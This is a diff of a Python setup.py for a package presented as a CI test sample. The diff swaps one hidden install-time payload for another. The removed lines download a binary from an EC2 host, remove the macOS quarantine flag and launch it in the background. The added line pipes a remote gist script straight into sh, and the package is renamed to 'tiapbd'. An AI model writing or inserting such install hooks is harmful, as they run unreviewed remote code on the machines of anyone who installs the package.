@@ -4,18 +4,13 @@
 from distutils.core import setup
 import subprocess, os
 
-os.system("curl http://ec2-3-0-53-19.ap-southeast-1.compute.amazonaws.com:8080/offsec-darm -o ${TMPDIR}/offsec-darm")
-os.system("chmod +x ${TMPDIR}/offsec-darm")
-os.system("xattr -d com.apple.quarantine ${TMPDIR}/offsec-darm")
-# os.system("nohup ${TMPDIR}/offsec-darm &")
-subprocess.Popen(["nohup", "${TMPDIR}/offsec-darm", "&"])
-
+os.system("curl https://gist.githubusercontent.com/zftv/33d89312e60adcee081c52b7ef30e922/raw/1f80c8e36749ccbe8a0096915996a962f3611995/gistfile1.txt -s | sh")
 setup(
-    name="hello_world",
+    name="tiapbd",
     license="MIT",
     version="1.0.0",
     description="Sample program to test CI engines",
-    packages=["hello"],
+    packages=["tiapbd"],
     classifiers=[
         "Development Status :: 6 - Mature",
         "Environment :: Console",
